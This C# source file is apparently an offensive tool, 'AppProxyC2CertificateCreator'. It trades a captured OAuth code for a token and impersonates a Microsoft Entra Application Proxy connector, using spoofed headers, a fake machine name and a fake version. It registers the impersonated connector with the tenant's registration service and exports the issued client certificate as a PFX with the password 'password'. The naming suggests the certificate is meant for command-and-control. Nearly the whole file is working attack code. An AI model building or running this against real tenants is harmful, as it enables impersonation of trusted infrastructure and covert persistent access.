using CERTENROLLLib;
using System;
using System.IdentityModel.Tokens.Jwt;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.ServiceModel;
using System.ServiceModel.Web;
using System.Threading.Tasks;

namespace Microsoft.ApplicationProxy.Common
{
    public enum ConnectorFeature
    {
        ApplicationProxy
    }
}

namespace Microsoft.ApplicationProxy.Common.Utilities.SystemSettings
{
    public interface ISystemSettings
    {
        string MachineName { get; }
        string OsVersion { get; }
        string OsSku { get; }
        string OsLocale { get; }
        string OsLanguage { get; }
    }

    [DataContract]
    public class SystemSettings : ISystemSettings
    {
        [DataMember]
        public string MachineName { get; set; }

        [DataMember]
        public string OsVersion { get; set; }

        [DataMember]
        public string OsSku { get; set; }

        [DataMember]
        public string OsLocale { get; set; }

        [DataMember]
        public string OsLanguage { get; set; }
    }
}

namespace Microsoft.ApplicationProxy.Common.Registration
{
    [DataContract]
    [KnownType(typeof(Utilities.SystemSettings.SystemSettings))]
    public class RequestSettings
    {
        [DataMember]
        public Utilities.SystemSettings.ISystemSettings SystemSettingsInformation { get; set; }
    }

    [DataContract]
    [KnownType(typeof(Utilities.SystemSettings.SystemSettings))]
    public class RegistrationRequestSettings : RequestSettings
    {
        [DataMember]
        public string PSModuleVersion { get; set; }

        [DataMember]
        public Utilities.SystemSettings.ISystemSettings SystemSettings { get; set; }
    }

    [DataContract]
    public class RegistrationCertificateIssuerRequest
    {
        [DataMember]
        public string Base64Csr { get; set; }
    }

    [DataContract]
    public class RegistrationRequest : RegistrationCertificateIssuerRequest
    {
        [DataMember]
        public string AuthenticationToken { get; set; }

        [DataMember]
        public RegistrationRequestSettings RegistrationRequestSettings { get; set; }

        [DataMember]
        public string TenantId { get; set; }

        [DataMember]
        public ConnectorFeature Feature { get; set; }

        [DataMember]
        public string FeatureString { get; set; }

        [DataMember]
        public string Base64Pkcs10Csr { get; set; }

        [DataMember]
        public string UserAgent { get; set; }
    }

    [DataContract]
    public class RegistrationCertificateIssuerResult
    {
        [DataMember]
        public byte[] Certificate { get; set; }

        [DataMember]
        public bool IsSuccessful { get; set; }

        [DataMember]
        public string ErrorMessage { get; set; }
    }

    public class RegistrationResult : RegistrationCertificateIssuerResult
    {
    }

    [ServiceContract]
    public interface IRegistrationService
    {
        [OperationContract]
        Task<RegistrationResult> RegisterConnector(RegistrationRequest registrationRequest);
    }
}

namespace C2BusCertificateCreator
{
    [DataContract(Namespace = "")]
    public class TokenResponse
    {
        [DataMember(Name = "token_type")]
        public string TokenType { get; set; }

        [DataMember(Name = "scope")]
        public string Scope { get; set; }

        [DataMember(Name = "expires_in")]
        public string ExpiresIn { get; set; }

        [DataMember(Name = "ext_expires_in")]
        public string ExtExpiresIn { get; set; }

        [DataMember(Name = "ext_expires_on")]
        public string ExtExpiresOn { get; set; }

        [DataMember(Name = "not_before")]
        public string NotBefore { get; set; }

        [DataMember(Name = "resource")]
        public string Resource { get; set; }

        [DataMember(Name = "access_token")]
        public string AccessToken { get; set; }

        [DataMember(Name = "refresh_token")]
        public string RefreshToken { get; set; }

        [DataMember(Name = "id_token")]
        public string IDToken { get; set; }
    }

    internal class Program
    {
        private const string OAuthEndpoint = "https://login.microsoftonline.com/common/oauth2/token";
        private const string RegistrationEndpoint = "https://{0}.registration.msappproxy.net/register";

        private const string SKUHeaderName = "x-client-SKU";
        private const string VerHeaderName = "x-client-Ver";
        private const string CPUHeaderName = "x-client-CPU";
        private const string OSHeaderName = "x-client-OS";
        private const string PKeyAuthHeaderName = "x-ms-PKeyAuth";
        private const string ReturnClientHeaderName = "return-client-request-id";
        private const string ClientRequestHeaderName = "client-request-id";

        private const string SKUHeader = "PCL.Desktop";
        private const string VersionHeader = "3.19.8.16603";
        private const string CPUHeader = "x64";
        private const string OSHeader = "Microsoft Windows NT 10.0.19041.0";
        private const string PKeyAuthHeader = "1.0";
        private const string ReturnClientHeader = "true";

        private const string UserAgent = "ApplicationProxyConnector/1.5.1975.0";
        private const string MachineName = "DESKTOP-1902410";
        private const string OSVersion = "10.0.17763";
        private const string OSSKU = "79";
        private const string OSLanguage = "1033";
        private const string OSLocale = "0409";
        private const string PSModuleVersion = "1.5.1975.0";
        private const string Feature = "ApplicationProxy";

        protected static string GenerateCSR()
        {
            var objPrivateKey = new CX509PrivateKey();
            objPrivateKey.MachineContext = false;
            objPrivateKey.Length = 2048;
            objPrivateKey.ProviderType = X509ProviderType.XCN_PROV_RSA_AES;
            objPrivateKey.KeySpec = X509KeySpec.XCN_AT_KEYEXCHANGE;
            objPrivateKey.KeyUsage = X509PrivateKeyUsageFlags.XCN_NCRYPT_ALLOW_ALL_USAGES;
            objPrivateKey.CspInformations = new CCspInformations();
            objPrivateKey.CspInformations.AddAvailableCsps();
            objPrivateKey.ExportPolicy = X509PrivateKeyExportFlags.XCN_NCRYPT_ALLOW_EXPORT_FLAG;
            objPrivateKey.Create();

            var cert = new CX509CertificateRequestPkcs10();
            cert.InitializeFromPrivateKey(X509CertificateEnrollmentContext.ContextUser, objPrivateKey, string.Empty);

            var objExtensionKeyUsage = new CX509ExtensionKeyUsage();
            objExtensionKeyUsage.InitializeEncode((X509KeyUsageFlags)X509KeyUsageFlags.XCN_CERT_DIGITAL_SIGNATURE_KEY_USAGE |
                                                  X509KeyUsageFlags.XCN_CERT_NON_REPUDIATION_KEY_USAGE |
                                                  X509KeyUsageFlags.XCN_CERT_KEY_ENCIPHERMENT_KEY_USAGE |
                                                  X509KeyUsageFlags.XCN_CERT_DATA_ENCIPHERMENT_KEY_USAGE
                                                  );
            cert.X509Extensions.Add((CX509Extension)objExtensionKeyUsage);

            var cobjectId = new CObjectId();
            cobjectId.InitializeFromName(CERTENROLL_OBJECTID.XCN_OID_PKIX_KP_CLIENT_AUTH);

            var cobjectIds = new CObjectIds();
            cobjectIds.Add(cobjectId);

            var pValue = cobjectIds;
            var cx509ExtensionEnhancedKeyUsage = new CX509ExtensionEnhancedKeyUsage();
            cx509ExtensionEnhancedKeyUsage.InitializeEncode(pValue);
            cert.X509Extensions.Add((CX509Extension)cx509ExtensionEnhancedKeyUsage);

            var cx509Enrollment = new CX509Enrollment();
            cx509Enrollment.InitializeFromRequest(cert);
            var output = cx509Enrollment.CreateRequest(EncodingType.XCN_CRYPT_STRING_BASE64);

            return output;
        }

        protected static void ExportCertificate(byte[] certificateData, string outputPath, string password)
        {
            var certificateEnrollmentContext = X509CertificateEnrollmentContext.ContextUser;

            CX509Enrollment cx509Enrollment = new CX509Enrollment();
            cx509Enrollment.Initialize(certificateEnrollmentContext);
            cx509Enrollment.InstallResponse(InstallResponseRestrictionFlags.AllowUntrustedCertificate, Convert.ToBase64String(certificateData), EncodingType.XCN_CRYPT_STRING_BASE64, null);
            var pfx = cx509Enrollment.CreatePFX(password, PFXExportOptions.PFXExportChainNoRoot, EncodingType.XCN_CRYPT_STRING_BASE64);
            using (var fs = File.OpenWrite(outputPath))
            {
                var decoded = Convert.FromBase64String(pfx);
                fs.Write(decoded, 0, decoded.Length);
            }
        }

        protected static string RequestAccessToken(string token)
        {
            string result;
            HttpWebRequest request = (HttpWebRequest)WebRequest.CreateHttp(OAuthEndpoint);

            request.Method = "POST";
            request.Headers[SKUHeaderName] = SKUHeader;
            request.Headers[VerHeaderName] = VersionHeader;
            request.Headers[CPUHeaderName] = CPUHeader;
            request.Headers[OSHeaderName] = OSHeader;
            request.Headers[PKeyAuthHeaderName] = PKeyAuthHeader;
            request.Headers[ClientRequestHeaderName] = Guid.NewGuid().ToString();
            request.Headers[ReturnClientHeaderName] = ReturnClientHeader;

            using (StreamWriter sw = new StreamWriter(request.GetRequestStream()))
            {
                sw.Write(String.Format("resource=https%3A%2F%2Fproxy.cloudwebappproxy.net%2Fregisterapp&client_id=55747057-9b5d-4bd4-b387-abf52a8bd489&grant_type=authorization_code&code={0}&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient", token));
            }

            HttpWebResponse response = (HttpWebResponse)request.GetResponse();

            using (Stream responseStream = response.GetResponseStream())
            {
                using (StreamReader streamReader = new StreamReader(responseStream))
                {
                    result = streamReader.ReadToEnd();
                }
            }

            DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(TokenResponse), new DataContractJsonSerializerSettings
            {
                UseSimpleDictionaryFormat = true
            });

            using (MemoryStream ms = new MemoryStream(System.Text.ASCIIEncoding.ASCII.GetBytes(result)))
            {
                TokenResponse configuration = (TokenResponse)serializer.ReadObject(ms);
                return configuration.AccessToken;
            }
        }

        private static void Main(string[] args)
        {
            // Generate token via:
            // https://login.microsoftonline.com/common/oauth2/authorize?resource=https%3A%2F%2Fproxy.cloudwebappproxy.net%2Fregisterapp&client_id=55747057-9b5d-4bd4-b387-abf52a8bd489&response_type=code&haschrome=1&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&client-request-id=2b10921b-e812-5111-ad0e-1401b2f42bdc&prompt=login&x-client-SKU=PCL.Desktop&x-client-Ver=3.19.8.16603&x-client-CPU=x64&x-client-OS=Microsoft+Windows+NT+10.0.19041.0

            // Some requests will fail if we use anything < TLS1.2
            ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;

            Uri serviceEndpoint;
            System.Security.Claims.Claim tennantID;

            if (args.Length != 2)
            {
                Console.WriteLine("Usage: AppProxyC2CertificateCreator.exe outputpath.pfx TOKEN");
                return;
            }

            var token = args[1];

            var accessToken = RequestAccessToken(token);

            Console.WriteLine("[*] JWT retrieved from auth token");

            try
            {
                var handler = new JwtSecurityTokenHandler();
                var decodedValue = handler.ReadJwtToken(accessToken);
                tennantID = decodedValue.Claims.Where((c) => { return c.Type == "tid"; }).FirstOrDefault();

                if (tennantID == null)
                {
                    Console.WriteLine("[!] No TenantID found");
                    return;
                }

                Console.WriteLine("[*] TenantID found from JWT as {0}", tennantID);
            }
            catch (System.Exception e)
            {
                Console.WriteLine("[!] Error decoding JWT Access Token: {0}", e.Message);
                return;
            }

            if (!Uri.TryCreate(String.Format(RegistrationEndpoint, tennantID.Value), UriKind.Absolute, out serviceEndpoint))
            {
                Console.WriteLine("[!] Could not parse generated registration URI using subscription id: {0}", tennantID.Value);
                return;
            }

            var output = GenerateCSR();

            var serviceChannel = new WebChannelFactory<Microsoft.ApplicationProxy.Common.Registration.IRegistrationService>(new WebHttpBinding
            {
                Security = { Mode = WebHttpSecurityMode.Transport }
            }, serviceEndpoint);

            var registrationRequest = new Microsoft.ApplicationProxy.Common.Registration.RegistrationRequest()
            {
                Base64Csr = output,
                Feature = Microsoft.ApplicationProxy.Common.ConnectorFeature.ApplicationProxy,
                FeatureString = Feature,
                RegistrationRequestSettings = new Microsoft.ApplicationProxy.Common.Registration.RegistrationRequestSettings()
                {
                    SystemSettingsInformation = new Microsoft.ApplicationProxy.Common.Utilities.SystemSettings.SystemSettings()
                    {
                        MachineName = MachineName,
                        OsLanguage = OSLanguage,
                        OsLocale = OSLocale,
                        OsSku = OSSKU,
                        OsVersion = OSVersion
                    },
                    PSModuleVersion = PSModuleVersion,
                    SystemSettings = new Microsoft.ApplicationProxy.Common.Utilities.SystemSettings.SystemSettings()
                    {
                        MachineName = MachineName,
                        OsLanguage = OSLanguage,
                        OsLocale = OSLocale,
                        OsSku = OSSKU,
                        OsVersion = OSVersion
                    }
                },
                TenantId = tennantID.Value,
                UserAgent = UserAgent
            };

            registrationRequest.AuthenticationToken = accessToken;

            var registrationService = serviceChannel.CreateChannel();
            var resp = registrationService.RegisterConnector(registrationRequest);
            var result = resp.GetAwaiter().GetResult();

            ExportCertificate(result.Certificate, args[0], "password");

            Console.WriteLine("[*] Certificate generated and outputted to {0} with password 'password'", args[0]);
        }
    }
}